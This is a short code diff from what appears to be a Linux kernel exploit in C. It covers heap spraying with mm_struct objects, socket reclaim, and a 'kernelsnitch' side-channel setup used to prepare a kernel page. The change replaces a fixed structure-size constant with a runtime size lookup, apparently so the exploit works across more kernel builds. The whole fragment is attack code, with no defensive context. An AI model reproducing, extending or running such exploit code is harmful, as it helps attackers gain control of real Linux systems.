@@ -46,7 +46,7 @@ void clear_pselect_write(void) {
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -437,7 +437,7 @@ uintptr_t prepare_kernel_page(void) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
   close_reclaim_sockets();
-  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
@@ -455,7 +455,7 @@ uintptr_t prepare_kernel_page(void) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
